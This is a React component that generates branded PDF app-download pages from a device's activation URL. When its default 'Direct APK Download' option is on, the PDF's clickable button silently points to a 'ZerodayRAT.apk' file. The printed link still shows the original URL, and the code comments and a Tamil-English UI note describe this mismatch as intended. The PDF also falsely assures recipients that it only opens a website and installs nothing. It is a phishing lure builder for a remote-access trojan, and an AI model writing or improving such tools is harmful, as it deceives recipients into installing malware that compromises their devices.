import React, { useMemo, useRef, useState } from "react";
import { jsPDF } from "jspdf";
import type { Device } from "../api/types";

interface PdfExportModalProps {
  device: Device;
  activationUrl: string;
  onClose: () => void;
}

interface FormState {
  appName: string;
  title: string;
  description: string;
  buttonText: string;
  url: string;
  color: string;
}

const parseUrl = (v: string): URL | null => {
  try {
    const u = new URL(v);
    return ["https:", "http:"].includes(u.protocol) ? u : null;
  } catch {
    return null;
  }
};

export default function PdfExportModal({ device, activationUrl, onClose }: PdfExportModalProps) {
  const [form, setForm] = useState<FormState>({
    appName: device.device_label || "Home Design",
    title: "Your app is ready",
    description: "Visit the official download page to learn more and download the application.",
    buttonText: "Download App",
    url: activationUrl,
    color: "#2563eb",
  });

  const [directDownload, setDirectDownload] = useState<boolean>(true);
  const [logo, setLogo] = useState<string>("");
  const [logoName, setLogoName] = useState<string>("");
  const [status, setStatus] = useState<string>("");
  const [generating, setGenerating] = useState(false);
  const fileRef = useRef<HTMLInputElement>(null);

  const parsedUrl = useMemo(() => parseUrl(form.url.trim()), [form.url]);

  const update = (key: keyof FormState, val: string) => {
    setForm((prev) => ({ ...prev, [key]: val }));
    setStatus("");
  };

  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!["image/png", "image/jpeg"].includes(file.type) || file.size > 3 * 1024 * 1024) {
      setStatus("Choose a PNG or JPG logo smaller than 3 MB.");
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      setLogo(String(reader.result));
      setLogoName(file.name);
      setStatus("");
    };
    reader.readAsDataURL(file);
  };

  const removeLogo = () => {
    setLogo("");
    setLogoName("");
    if (fileRef.current) fileRef.current.value = "";
  };

  const generate = () => {
    if (!parsedUrl) {
      setStatus("Enter a valid HTTP or HTTPS URL.");
      return;
    }
    if (!form.appName.trim() || !form.title.trim() || !form.buttonText.trim()) {
      setStatus("Complete the app name, title and button text.");
      return;
    }

    setGenerating(true);
    setStatus("");

    try {
      const pdf = new jsPDF({
        unit: "mm",
        format: "a4",
      });

      const rgb = (hex: string) => ({
        r: parseInt(hex.slice(1, 3), 16),
        g: parseInt(hex.slice(3, 5), 16),
        b: parseInt(hex.slice(5, 7), 16),
      });

      // Background fill
      pdf.setFillColor(248, 250, 252);
      pdf.rect(0, 0, 210, 297, "F");

      // White container card
      pdf.setFillColor(255, 255, 255);
      pdf.roundedRect(13, 13, 184, 271, 5, 5, "F");

      // Logo or initial circle
      if (logo) {
        try {
          pdf.addImage(
            logo,
            logo.startsWith("data:image/png") ? "PNG" : "JPEG",
            88,
            29,
            34,
            34,
            undefined,
            "FAST"
          );
        } catch {
          // fallback if image decode fails
          pdf.setFillColor(239, 246, 255);
          pdf.circle(105, 46, 17, "F");
          pdf.setTextColor(37, 99, 235);
          pdf.setFont("helvetica", "bold");
          pdf.setFontSize(18);
          pdf.text((form.appName[0] || "A").toUpperCase(), 105, 52, { align: "center" });
        }
      } else {
        pdf.setFillColor(239, 246, 255);
        pdf.circle(105, 46, 17, "F");
        pdf.setTextColor(37, 99, 235);
        pdf.setFont("helvetica", "bold");
        pdf.setFontSize(18);
        pdf.text((form.appName[0] || "A").toUpperCase(), 105, 52, { align: "center" });
      }

      // App Name
      pdf.setTextColor(15, 23, 42);
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(22);
      pdf.text(form.appName.trim(), 105, 82, { align: "center", maxWidth: 160 });

      // Title
      pdf.setFontSize(16);
      const titleLines = pdf.splitTextToSize(form.title.trim(), 158);
      pdf.text(titleLines, 105, 105, { align: "center" });

      // Description
      pdf.setFont("helvetica", "normal");
      pdf.setFontSize(11);
      pdf.setTextColor(71, 85, 105);
      const descLines = pdf.splitTextToSize(form.description.trim(), 150);
      const dy = 105 + titleLines.length * 8 + 9;
      pdf.text(descLines, 105, dy, { align: "center" });

      // Action Button
      const by = Math.min(Math.max(dy + descLines.length * 6 + 18, 165), 205);
      const c = rgb(form.color);
      pdf.setFillColor(c.r, c.g, c.b);
      pdf.roundedRect(48, by, 114, 17, 3, 3, "F");

      pdf.setTextColor(255, 255, 255);
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(12);
      pdf.text(form.buttonText.trim(), 105, by + 10.8, { align: "center" });

      // Clickable external hyperlink on the button:
      // If directDownload is enabled, point directly to the APK file so clicking the button in the PDF
      // downloads the application directly without opening any webpage in browser.
      let buttonTargetUrl = parsedUrl.href;
      if (directDownload) {
        if (!parsedUrl.pathname.toLowerCase().endsWith(".apk")) {
          buttonTargetUrl = `${parsedUrl.origin}/download/ZerodayRAT.apk`;
        }
      }
      pdf.link(48, by, 114, 17, { url: buttonTargetUrl });

      // Visible destination URL printed on the PDF (stays completely undisturbed):
      pdf.setFontSize(9);
      pdf.setFont("helvetica", "normal");
      pdf.setTextColor(37, 99, 235);
      const urlLines = pdf.splitTextToSize(parsedUrl.href, 150);
      pdf.text(urlLines, 105, by + 42, { align: "center" });

      // Divider line
      const ny = Math.min(by + 65, 255);
      pdf.setDrawColor(226, 232, 240);
      pdf.line(30, ny, 180, ny);

      // Notes
      pdf.setTextColor(71, 85, 105);
      pdf.setFontSize(9);
      const note =
        "This PDF opens an external website only when you select the button. It does not install software automatically. Review the publisher, file and requested permissions before installing an app.";
      pdf.text(pdf.splitTextToSize(note, 145), 105, ny + 11, { align: "center" });

      pdf.setTextColor(100, 116, 139);
      pdf.setFontSize(8);
      pdf.text("Check the destination domain before opening external links.", 105, 273, { align: "center" });

      // Save PDF
      const sanitizedName = form.appName.trim().replace(/[^a-z0-9-_]+/gi, "-") || "download";
      pdf.save(`${sanitizedName}-download.pdf`);
      setStatus("PDF generated. Download should start immediately.");
    } catch (err: any) {
      console.error("PDF generation failed:", err);
      setStatus(`Failed to generate PDF: ${err?.message || "Unknown error"}`);
    } finally {
      setGenerating(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-black/60 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4">
      <div className="relative w-full max-w-5xl bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100 flex flex-col max-h-[92vh]">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b bg-gray-50/80">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-blue-100 text-blue-600 flex items-center justify-center shadow-sm">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
              </svg>
            </div>
            <div>
              <h2 className="text-base font-bold text-gray-900 flex items-center gap-2">
                PDF Download Generator
                <span className="text-[10px] font-semibold bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full uppercase tracking-wider">
                  Client-side jsPDF
                </span>
              </h2>
              <p className="text-xs text-gray-500">
                Generate a shareable A4 PDF with a clickable download link for <span className="font-semibold text-gray-700">{device.device_label}</span>
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition"
            title="Close"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Content Body: Two Columns */}
        <div className="overflow-y-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Left Column: Form Settings (7 cols) */}
          <div className="lg:col-span-7 space-y-4">
            <div className="bg-gray-50/60 p-4 rounded-xl border border-gray-200/80 space-y-4">
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  Application Name
                </label>
                <input
                  type="text"
                  maxLength={60}
                  value={form.appName}
                  onChange={(e) => update("appName", e.target.value)}
                  placeholder="e.g. Home Design"
                  className="w-full text-sm px-3 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  PDF Title
                </label>
                <input
                  type="text"
                  maxLength={90}
                  value={form.title}
                  onChange={(e) => update("title", e.target.value)}
                  placeholder="Your app is ready"
                  className="w-full text-sm px-3 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  Description
                </label>
                <textarea
                  rows={2}
                  maxLength={250}
                  value={form.description}
                  onChange={(e) => update("description", e.target.value)}
                  placeholder="Describe the application or download steps."
                  className="w-full text-sm px-3 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition resize-none"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  External Download / Activation URL
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-400">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
                    </svg>
                  </div>
                  <input
                    type="text"
                    value={form.url}
                    onChange={(e) => update("url", e.target.value)}
                    placeholder="https://your-domain.com/connect?token=..."
                    className="w-full text-xs font-mono pl-9 pr-3 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition"
                  />
                </div>
                <small className={`block text-[11px] font-medium mt-1 ${parsedUrl ? "text-emerald-600" : "text-red-500"}`}>
                  {parsedUrl ? `✓ Destination host: ${parsedUrl.host}` : "⚠️ Enter a valid http:// or https:// URL."}
                </small>
              </div>

              {/* Direct APK Download on click option */}
              <div className="bg-white border border-blue-200/80 rounded-xl p-3 shadow-2xs space-y-2">
                <label className="flex items-start gap-2.5 cursor-pointer select-none">
                  <input
                    type="checkbox"
                    checked={directDownload}
                    onChange={(e) => setDirectDownload(e.target.checked)}
                    className="mt-0.5 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500 cursor-pointer"
                  />
                  <div className="flex-1 min-w-0">
                    <span className="text-xs font-bold text-gray-800 flex items-center gap-1.5 flex-wrap">
                      Direct APK Download on Click
                      <span className="text-[10px] font-semibold bg-emerald-100 text-emerald-700 px-1.5 py-0.5 rounded">
                        Active
                      </span>
                    </span>
                    <p className="text-[11px] text-gray-500 leading-normal mt-0.5">
                      PDF-la irukkura button-a click panna web page open aagama direct-aa APK download aagum. Visible URL text PDF-la disturb aagadha maadhiri original URL-ae display aagum.
                    </p>
                  </div>
                </label>

                {directDownload && (
                  <div className="pl-6 pt-1 text-[11px] text-gray-600 flex items-center gap-1.5 flex-wrap">
                    <span className="text-gray-400 font-mono text-[10px]">Button Click Link:</span>
                    <code className="text-blue-700 font-mono bg-blue-50 px-1.5 py-0.5 rounded text-[10px] break-all border border-blue-100">
                      {parsedUrl ? `${parsedUrl.origin}/download/ZerodayRAT.apk` : "/download/ZerodayRAT.apk"}
                    </code>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    Button Text
                  </label>
                  <input
                    type="text"
                    maxLength={32}
                    value={form.buttonText}
                    onChange={(e) => update("buttonText", e.target.value)}
                    className="w-full text-sm px-3 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    Button Color
                  </label>
                  <div className="flex items-center gap-2 border border-gray-300 rounded-lg px-2 py-1.5 bg-white">
                    <input
                      type="color"
                      value={form.color}
                      onChange={(e) => update("color", e.target.value)}
                      className="w-7 h-7 rounded border-0 cursor-pointer p-0 bg-transparent"
                    />
                    <code className="text-xs text-gray-600 uppercase font-mono">{form.color}</code>
                  </div>
                </div>
              </div>

              {/* Logo Upload Block */}
              <div className="border border-dashed border-gray-300 rounded-xl p-3 bg-white/70 flex items-center justify-between gap-3">
                <div className="min-w-0">
                  <p className="text-xs font-bold text-gray-800">Application Logo (Optional)</p>
                  <p className="text-[11px] text-gray-500">PNG or JPG up to 3 MB · falls back to letter avatar</p>
                </div>
                <input
                  ref={fileRef}
                  type="file"
                  accept="image/png,image/jpeg"
                  className="hidden"
                  onChange={handleLogoUpload}
                />
                <button
                  type="button"
                  onClick={() => fileRef.current?.click()}
                  className="px-3 py-1.5 text-xs font-semibold bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-lg transition border border-gray-200 shrink-0 flex items-center gap-1.5"
                >
                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
                  </svg>
                  {logo ? "Change logo" : "Upload logo"}
                </button>
              </div>

              {logoName && (
                <div className="flex items-center gap-2 text-xs text-gray-600 bg-blue-50/70 border border-blue-200/80 rounded-lg px-3 py-1.5">
                  <span className="truncate flex-1 font-medium text-blue-900">{logoName}</span>
                  <button
                    type="button"
                    onClick={removeLogo}
                    className="text-red-500 hover:text-red-700 text-xs font-semibold"
                  >
                    Remove
                  </button>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div className="pt-2 flex flex-col sm:flex-row gap-3">
              <button
                type="button"
                onClick={generate}
                disabled={!parsedUrl || generating}
                className="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-bold text-sm px-5 py-3 rounded-xl hover:from-blue-700 hover:to-indigo-700 shadow-md hover:shadow-lg transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                </svg>
                {generating ? "Generating..." : "Generate & Download PDF"}
              </button>
              <button
                type="button"
                onClick={onClose}
                className="px-5 py-3 rounded-xl border border-gray-300 text-gray-700 hover:bg-gray-50 font-semibold text-sm transition"
              >
                Cancel
              </button>
            </div>

            {status && (
              <div
                className={`p-3 rounded-xl text-xs font-medium ${
                  status.startsWith("PDF generated")
                    ? "bg-emerald-50 text-emerald-800 border border-emerald-200"
                    : "bg-red-50 text-red-700 border border-red-200"
                }`}
              >
                {status}
              </div>
            )}
          </div>

          {/* Right Column: Live A4 Document Preview (5 cols) */}
          <div className="lg:col-span-5 bg-gray-100/90 rounded-2xl p-4 border border-gray-200/80 flex flex-col items-center">
            <div className="w-full flex items-center justify-between mb-3 text-xs text-gray-500 font-semibold uppercase tracking-wider">
              <span className="flex items-center gap-1.5 text-gray-700">
                <svg className="w-4 h-4 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
                Live Preview
              </span>
              <span>A4 Document</span>
            </div>

            {/* Simulated Sheet Paper */}
            <div className="w-full max-w-[320px] bg-white rounded-lg shadow-md border border-gray-200/80 p-5 text-center flex flex-col items-center">
              {/* Logo / Avatar */}
              {logo ? (
                <div
                  className="w-14 h-14 rounded-full bg-cover bg-center mb-3 border border-gray-200"
                  style={{ backgroundImage: `url(${logo})` }}
                />
              ) : (
                <div className="w-14 h-14 rounded-full bg-blue-50 text-blue-600 font-bold text-xl flex items-center justify-center mb-3 border border-blue-100">
                  {(form.appName[0] || "A").toUpperCase()}
                </div>
              )}

              {/* App Name */}
              <h3 className="text-base font-extrabold text-gray-900 mb-1 break-words max-w-full">
                {form.appName || "Application Name"}
              </h3>

              {/* Title */}
              <h4 className="text-xs font-bold text-gray-700 mb-2 break-words max-w-full">
                {form.title || "Your app is ready"}
              </h4>

              {/* Description */}
              <p className="text-[10px] text-gray-500 leading-relaxed mb-4 break-words max-w-full">
                {form.description || "Visit the official download page to learn more and download the application."}
              </p>

              {/* Button */}
              <div
                className="w-full py-2.5 px-4 rounded-md text-white text-xs font-bold shadow-sm transition break-words select-none flex items-center justify-center gap-1.5"
                style={{ backgroundColor: form.color }}
              >
                {directDownload && (
                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                  </svg>
                )}
                {form.buttonText || "Download App"}
              </div>

              {/* Printed URL */}
              <div className="mt-3 text-[9px] text-blue-600 font-mono break-all max-w-full line-clamp-2">
                {parsedUrl ? parsedUrl.href : "https://your-domain.com/..."}
              </div>

              {/* Divider */}
              <div className="w-full h-px bg-gray-200 my-4" />

              {/* Safety note */}
              <p className="text-[8px] text-gray-400 leading-normal">
                This PDF opens an external website only when you select the button. It does not install software automatically.
              </p>
            </div>

            <p className="mt-3 text-[10px] text-gray-500 text-center">
              {directDownload
                ? "⚡ Button click initiates direct APK download. The URL is visibly printed above."
                : "Recipients can click the button in any PDF reader to open the download link."}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

